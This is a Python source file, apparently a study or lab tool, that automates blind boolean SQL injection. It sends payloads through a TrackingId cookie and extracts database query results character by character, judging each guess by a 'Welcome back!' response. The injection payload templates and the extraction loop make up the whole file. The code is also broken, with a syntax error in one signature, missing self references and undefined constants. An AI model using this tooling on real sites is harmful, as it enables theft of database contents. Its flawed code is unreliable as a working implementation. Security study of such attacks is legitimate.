import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)


class SQLi:
    def __init__(self, max_length=100, avail_chars=string.printable):
        self.max_length = max_length
        self.avail_chars = avail_chars
        pass
    
    def format_length_query(self, inner_query, length):
        """ override in subclass"""
        return f"zzzz' or (select length(({inner_query}))={length})-- "
    
    def format_char_query(self< inner_query, index, char):
        """override in subclass"""
        return (
            f"zzzz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "
        )
    def is_true(self, resp):
        """override in subclass"""
        if "Welcome back!" in resp.text:
            return True
        return False
    def format_request(self, url, outer_query):
        """override in subclass"""
        cookies = {
            "TrackingId": outer_query,
        }
        request = requests.Request("GET", url, cookies=cookies)
        prepped = request.prepare()
        return prepped
    
    def determine_response_length(self, inner_query, url, no_proxy=False):
        log.info("determinging response length")
        sess = requests.Session()
        for i in range(1, MAX_LENGTH):
            outer_query = format_length_query(inner_query, i)
            prepped = format_request(url, outer_query)
            if no_proxy:
                resp = sess.send(prepped)
            else:
                resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
            if is_true(resp):
                response_length = i
                log.info(f"Length of query response is {response_length}")
                return i
    
    
    def determine_response_char(task):
        sess = requests.Session()
        chars = [ord(x) for x in AVAIL_CHARS]
        for x in chars:
            outer_query = format_char_query(task["inner_query"], task["position"], x)
            prepped = format_request(task["url"], outer_query)
            if task["no_proxy"]:
                resp = sess.send(prepped)
            else:
                resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
            if is_true(resp): #he
                task["result"] = str(chr(x))
                return task
    
